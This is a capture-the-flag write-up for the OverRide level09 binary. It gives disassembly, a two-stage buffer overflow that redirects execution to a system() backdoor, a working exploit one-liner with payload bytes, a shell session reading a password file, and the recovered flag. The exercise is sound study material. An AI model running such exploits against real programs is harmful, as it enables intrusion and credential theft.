# **Level09**

## **Binary Analysis**

When run, it displays a welcome message and then handles user input through the handle_msg() function.
The program uses a structure to store a username (up to 40 characters) and a message (up to 140 characters). It first prompts the user to enter a username with the set_username() function, and then asks for a message via the set_msg() function.
There's also an unused secret_backdoor() function that could read a command from the user and execute it, but this function is never called in the normal program flow.

**main function:**
```bash
0x0000000000000aa8 <+0>:  push   %rbp
0x0000000000000aac <+4>:  lea    0x15d(%rip),%rdi      # 0xc10
0x0000000000000ab3 <+11>: callq  0x730 <puts@plt>
0x0000000000000ab8 <+16>: callq  0x8c0 <handle_msg>
```
Main simply displays a message and calls handle_msg.

**handle_msg key parts:**
```bash
0x00000000000008d2 <+18>: add    $0x8c,%rax           # Points to username field at offset 140
0x00000000000008ff <+63>: movl   $0x8c,-0xc(%rbp)     # Sets len field to 140
0x0000000000000910 <+80>: callq  0x9cd <set_username>
0x000000000000091f <+95>: callq  0x932 <set_msg>
```
**set_username key part:**
```bash
0x0000000000000a5f <+146>: mov  %cl,0x8c(%rdx,%rax,1) # Writes to username starting at offset 140
0x0000000000000a6a <+157>: cmpl $0x28,-0x4(%rbp)      # Checks if i > 40 (0x28)
```
This shows username is written to offset 140 and loop continues until i > 40.

**set_msg key part:**
```bash
0x00000000000009a9 <+119>: mov  0xb4(%rax),%eax       # Loads len field (at offset 180 = 0xb4)
0x00000000000009c6 <+148>: callq 0x720 <strncpy@plt>   # Copies input using the length
```
Uses the len value at offset 0xb4 (180) to control strncpy.

**secret_backdoor function:**
```bash
0x00000000000008ad <+33>: callq 0x770 <fgets@plt>
0x00000000000008b9 <+45>: callq 0x740 <system@plt>
```
Gets user input and passes it directly to system().
## **Vulnerability**

**Two-Stage Buffer Overflow**

1. First Overflow:
    - Username buffer is 40 bytes
    - Length field is at offset 40
    - Can overflow 1 byte to modify message length
2. Second Overflow:
    - Modified length allows writing beyond message buffer
    - Can overwrite return address with secret_backdoor

## **Exploit**

**Exploit Structure**

```python
# Stage 1: Username overflow
"A" * 40       # Fill username buffer
"\xff"         # Overwrite length byte to maximum
"\n"           # Username input terminator

# Stage 2: Message overflow
"B" * 200      # Padding to reach return address
"\x8c\x48\x55\x55\x55\x55\x00\x00"  # secret_backdoor address
```

**Final Exploit**

```bash
(python -c 'print "A"*40 + "\xff" + "\n" + "B"*200 + "\x8c\x48\x55\x55\x55\x55\x00\x00"'; cat) | ./level09
```

**Exploit Execution**

```bash
level09@OverRide:~$ (python -c 'print "A"*40 + "\xff" + "\n" + "B"*200 + "\x8c\x48\x55\x55\x55\x55\x00\x00"'; cat) | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
>: Msg @Unix-Dude
>>: >: Msg sent!
cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```

**How It Works**

1. **First Stage (Username)**:
    - Fill username buffer with 40 'A's
    - Overflow one byte with \xff to modify message length
    - This allows writing beyond normal message bounds
2. **Second Stage (Message)**:
    - 200 bytes of 'B's as padding
    - Place secret_backdoor address (0x55555555488c)
    - When function returns, it jumps to secret_backdoor
3. **Command Execution**:
    - secret_backdoor function executes
    - We can input shell commands
    - Read the flag file

## **Flag**

```
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE

```
